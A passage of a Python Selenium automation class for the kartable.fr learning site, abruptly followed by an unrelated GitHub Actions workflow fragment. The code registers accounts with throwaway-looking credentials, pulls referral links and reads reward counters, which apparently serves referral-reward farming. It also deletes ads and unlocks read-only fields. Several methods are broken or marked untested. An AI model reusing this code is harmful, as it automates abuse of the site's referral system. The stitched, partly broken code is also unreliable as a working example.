        # https://www.kartable.fr/compte/informations-personnelles/modifier-adresse-email
        return self.driver.find_element_by_tag_name("strong").text

    def delete_account(self):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles
        helium.click("SUPPRIMER LE COMPTE")
        helium.click("SUPPRIMER DÉFINITIVEMENT")

    def levels_alternative(self):
        return "Not implemented yet"
        # requires status: not signed in
        # requires url: https://www.kartable.fr/
        tmp = self.driver.find_element_by_class_name("et_pb_text_inner")
        for i in tmp:
            if "Classes" == tmp.find_element_by_class_name("links-list__title"):
                # tmp.find_element_by_tag_name("a").href +.text
                pass

    @property
    def account_info(self):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles
        firstname = self.driver.find_element_by_xpath(
            "//input[@name='firstName']")
        lastname = self.driver.find_element_by_xpath(
            "//input[@name='lastName']")
        birthdate = ""
        input__group = self.driver.find_element_by_class_name(
            "input__group--date")  # includes a bunch of select tags
        select = input__group.find_elements_by_tag_name('select')
        for i in select:
            birthdate += Select(i).first_selected_option.text+"/"
        tmp = ""
        for i in birthdate[:-1].split("/"):
            tmp += "0"+i+"/" if len(i) == 1 else i + "/"
        birthdate = tmp[:-1]
        return {"firstname": firstname, "lastname": lastname, "birthdate": birthdate}

    def set_birthdate(self):
        #!!!!!NOT TESTED YET!!!!!!
        if self.birthdate != None:
            day_to_be_set = self.birthdate[0]
            month_to_be_set = self.birthdate[1]
            year_to_be_set = self.birthdate[2]
            try:
                input__group = self.driver.find_element_by_class_name(
                    "input__group--date")  # includes a bunch of select tags
                select = input__group.find_elements_by_tag_name('select')
                for item in select:
                    if item.get_attribute("name") == "birthDateDay":
                        day = Select(item)
                        day.select_by_value(day_to_be_set)
                    elif item.get_attribute("name") == "birthDateMonth":
                        month = Select(item)
                        month.select_by_value(month_to_be_set)
                    elif item.get_attribute("name") == "birthDateYear":
                        year = Select(item)
                        year.select_by_value(year_to_be_set)
            except Exception as e:
                print("Failed to set birthdate", e)

    def subject_categories(self):
        return "Not implemented yet"
        #mm = [i for i in self.driver.find_elements_by_class_name("category__link")]

    def delete_premium_ads(self):
        #!!!!!NOT TESTED YET!!!!!!
        self.driver.execute_script(
            'try{document.getElementsByTagName("premium-link")[0].remove();}catch(error){console.error(error);}')
        self.driver.execute_script(
            'try{document.getElementsByClassName("cross-selling-ad")[0].parentElement.remove();}catch(error){console.error(error);}')

    @property
    def has_school(self):
        return "Not implemented yet"

    @property
    def subjects(self, classe):
        #!!!!!NOT TESTED YET!!!!!!
        self.unavailable = []
        self.courses_info = []
        # let it redirect to homepage to avoid spelling mistakes (instead of get("https://www.kartable.fr/cinquieme") for eg)
        self.driver.get("https://www.kartable.fr/")
        try:
            self.courses_info = [{i.text: i.get_attribute("href")} for i in self.driver.find_elements_by_class_name(
                "course__link")]  # href is None if not available
        except Exception as e:
            print("Failed to get course titles", e)
            self.courses_info = False

        try:
            for i in self.driver.find_elements_by_class_name("course--coming-soon"):
                self.unavailable.append(
                    i.find_element_by_class_name("course__link").text)
        except Exception as e:
            print("Failed to get name of future available subjects")
            self.unavailable = False
        return self.courses_info+self.unavailable

    @property
    def levels(self):
        return "Not implemented yet"
        """https://www.kartable.fr/{classe}"""
        helium.click(self.current_level)
        m = list(set(
            [i.text for i in self.driver.find_elements_by_class_name("school-year__level")]))
        self.driver.find_element_by_class_name("icon-close").click()

    @property
    def current_level(self):
        try:
            level = self.driver.find_element_by_class_name(
                "school-year__level").text
        except Exception as e:
            print("Failed to get the level", e)
            level = False
        finally:
            return level

    @property
    def sponso_url(self):
        self.driver.get(
            "https://www.kartable.fr/compte/parrainage?questIdentifier=sponsorship_fifth")
        time.sleep(5)
        self.driver.execute_script(
            'try{document.getElementsByTagName("input")[0].removeAttribute("readonly");}catch(error){console.error(error);}')
        self._sponso_url = self.driver.execute_script(
            'return document.getElementsByTagName("input")[0].value;')
        if not self._sponso_url.startswith("https://"):
            return False
        return self._sponso_url

    @property
    def ruby_amount(self):
        """Works for https://www.kartable.fr/rubis, https://www.kartable.fr/cinquieme, https://www.kartable.fr/ (because redirects to .../{classe}"""
        try:
            rubies = self.driver.find_element_by_class_name(
                "ruby-counter__total").text
        except Exception as e:
            print("Failed to get the amount of rubies", e)
            rubies = False
        finally:
            return rubies


"""
Usage:
    instance = main("6e","philotea","rotrions","manlymprinc1241478451ent@gmail.com","xfcgvhibu1457hoomskpjoihugyf")
    time.sleep(5)
    instance.register()
    ...
    url = instance.sponso_url
    instance.log_out()

""" 
        python-version: ${{ matrix.python-version }}
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        python -m pip install flake8 pytest
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
    - name: Lint with flake8
      run: |
        # stop the build if there are Python syntax errors or undefined names
        flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide
        flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
    - name: Test with pytest
      run: |
        pytest
